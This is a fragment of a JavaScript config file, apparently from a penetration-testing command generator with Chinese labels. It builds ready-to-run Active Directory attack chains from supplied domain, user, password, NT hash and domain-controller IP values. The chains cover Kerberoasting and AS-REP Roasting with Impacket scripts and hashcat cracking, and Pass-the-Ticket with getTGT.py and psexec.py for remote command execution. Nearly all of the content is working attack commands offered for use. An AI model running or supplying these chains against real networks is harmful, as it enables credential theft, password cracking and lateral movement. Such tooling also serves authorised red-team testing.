    ...
    commands: [
      {
        ...
        build: (p) => `# 1. 枚举 SPN\nGetUserSPNs.py ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 请求票据\nGetUserSPNs.py ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')} -request -outputfile hashes.txt\n\n# 3. hashcat 破解\nhashcat -m 13100 hashes.txt wordlist.txt`,
      },
      {
        id: 'asrep-flow',
        title: 'AS-REP Roasting 完整流程',
        description: '1. 枚举无预认证用户 -> 2. 离线破解',
        build: (p) => `# 1. 枚举\nGetNPUsers.py ${v(p.domain, 'DOMAIN')}/ -usersfile users.txt -format hashcat -outputfile asrep.txt\n\n# 2. hashcat 破解\nhashcat -m 18200 asrep.txt wordlist.txt`,
      },
      {
        id: 'ptt-flow',
        title: 'Pass-the-Ticket 完整流程',
        description: '1. 获取 TGT -> 2. 设置环境变量 -> 3. 使用票据',
        build: (p) => `# 1. 获取 TGT\ngetTGT.py ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -hashes :${v(p.ntHash, 'NTHASH')} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 设置环境变量\nexport KRB5CCNAME=${v(p.username, 'USER')}.ccache\n\n# 3. 使用 Kerberos 认证执行命令\npsexec.py ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}@${v(p.targetHost, 'TARGET')} -k -no-pass`,
      },
    ],
  },
];
